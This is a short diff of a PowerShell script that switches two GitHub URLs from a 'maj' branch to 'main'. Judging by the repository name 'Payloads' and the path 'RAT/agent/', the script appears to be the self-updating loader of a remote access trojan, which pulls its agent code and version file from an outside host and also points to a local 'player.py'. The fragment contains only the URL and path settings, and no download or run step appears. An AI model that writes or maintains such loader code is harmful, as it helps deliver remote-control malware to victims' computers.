@@ -1,5 +1,5 @@
-$versionUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/refs/heads/maj/RAT/version.json"
-$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/agent/"
+$versionUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/refs/heads/main/RAT/version.json"
+$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $playerPath = Join-Path $scriptDir "player.py"
 
